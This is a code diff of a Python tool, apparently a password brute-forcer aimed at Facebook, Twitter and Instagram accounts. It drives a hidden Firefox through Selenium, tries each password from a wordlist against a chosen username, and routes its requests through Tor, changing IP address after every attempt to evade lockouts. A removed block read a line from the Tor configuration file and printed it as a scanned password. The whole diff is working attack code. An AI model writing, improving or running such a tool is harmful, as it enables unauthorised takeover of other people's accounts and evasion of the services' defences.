@@ -6,7 +6,7 @@ from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from pyvirtualdisplay import Display
-from urllib2 import urlopen
+from urllib import urlopen
 
 reload(sys)
 
@@ -30,6 +30,8 @@ def main():
 
     args = parser.parse_args()
 
+    global fb_name, service
+
     service = args.service
     username = args.username
     wordlist = args.password
@@ -46,9 +48,6 @@ def main():
     if delay is None:
 
         delay = 1
-    
-
-    global Hash, fb_name
 
     os.system("clear")
 
@@ -60,17 +59,6 @@ def main():
 
  
     os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") # restarting tor & removing geckodriver log
-
-
-    with open('/etc/tor/torrc','r') as f:
-
-        contents = f.readlines()
-
-        data = contents[59]
-
-        Hash = data.rsplit(":",1)[1]
-
-    sys.stdout.write("[ " + G + "ok" + W + " ]" + " Successfully Scanned Password : " + Hash)
 
     Bruter(service, username, wordlist, delay).execute()
 
@@ -111,9 +99,9 @@ class Bruter(object):
 
     def usercheck(self, username, service):          # Checking Username
 
-     #  display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
+       display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
 
-      # display.start()     
+       display.start()
 
        driver = webdriver.Firefox()
 
@@ -125,7 +113,7 @@ class Bruter(object):
 
                assert (("We couldn't find anything for") not in driver.page_source)
 
-               driver.close()
+               driver.quit()
 
                os.system("clear && /etc/init.d/tor restart")
 
@@ -135,7 +123,7 @@ class Bruter(object):
 
                assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
 
-               driver.close()
+               driver.quit()
 
            elif service == "instagram":
 
@@ -143,48 +131,20 @@ class Bruter(object):
 
                assert (("Sorry, this page isn't available.") not in driver.page_source)
 
-               driver.close()
+               driver.quit()
 
        except AssertionError:
 
            return 1
 
+
+
+
     def webBruteforce(self, username, wordlist, service, delay):
 
-        my_ip = urlopen("http://ip.42.pl/raw").read()
+        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
 
         driver = webdriver.Firefox()
-
-        if service == "facebook":
-
-            driver.get("https://touch.facebook.com/login?soft=auth/")
-
-            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
-
-            elem = driver.find_element_by_name("email")
-            
-        elif service == "twitter":
-
-            driver.get("https://mobile.twitter.com/session/new")
-
-            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
-
-            elem = driver.find_element_by_name("session[username_or_email]")
-
-        elif service == "instagram":
-
-            driver.get("https://www.instagram.com/accounts/login/?force_classic_login")
-
-            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
-
-            elem = driver.find_element_by_name("username")
-
-        elem.clear()
-        elem.send_keys(username)
-
-        j=0 
-
-        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
 
         wordlist = open(wordlist, 'r')
 
@@ -193,6 +153,35 @@ class Bruter(object):
             password = i.strip("\n")
 
             try:               
+
+                driver = webdriver.Firefox()
+
+                if service == "facebook":
+
+                    driver.get("https://touch.facebook.com/login?soft=auth/")
+
+                    WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+
+                    elem = driver.find_element_by_name("email")
+            
+                elif service == "twitter":
+
+                    driver.get("https://mobile.twitter.com/session/new")
+
+                    WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+
+                    elem = driver.find_element_by_name("session[username_or_email]")
+
+                elif service == "instagram":
+
+                    driver.get("https://www.instagram.com/accounts/login/?force_classic_login")
+
+                    WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+
+                    elem = driver.find_element_by_name("username")
+
+                elem.clear()
+                elem.send_keys(username)
 
                 if service == "facebook":
 
@@ -209,8 +198,6 @@ class Bruter(object):
                 elem.clear()
                 elem.send_keys(password)
                 elem.send_keys(Keys.RETURN)
-                
-                sleep(delay) 
 
 
                 if service == "facebook":
@@ -223,25 +210,23 @@ class Bruter(object):
 
                         print(G + ("  Username: {} \t| Password found: {} \n".format(username,password)) + W)
 
+                        driver.quit()
+
                         self.stopTOR()
 
                 elif service == "instagram":
 
-                    assert (("Log in — Instagram") in driver.title)
+                   assert (("Log in — Instagram") in driver.title)
 
-                if j == 2:
 
-                   j=0
+                driver.quit()
 
-                   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5 , "127.0.0.1", 9050, True)
+                my_ip = urlopen("http://ip.42.pl/raw").read()
 
-                   socket.socket = socks.socksocket
-
-                   my_ip = urlopen("http://ip.42.pl/raw").read()
+                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
+                socket.socket = socks.socksocket
 
                 print(O + ("  Password: {} \t| Failed \t| IP : {} \n ".format(password,my_ip)) + W)
-
-                j+=1
 
                 sleep(delay)
 
@@ -249,13 +234,15 @@ class Bruter(object):
             
                 print(G + ("  Username: {} \t| Password found: {}\n".format(username,password)) + W)
 
+                driver.quit()
+
                 self.stopTOR()
 
             except Exception as e:
 
                 print(R + ("\nError : {}".format(e)) + W)
 
-                driver.close()
+                driver.quit()
 
                 self.stopTOR()
 
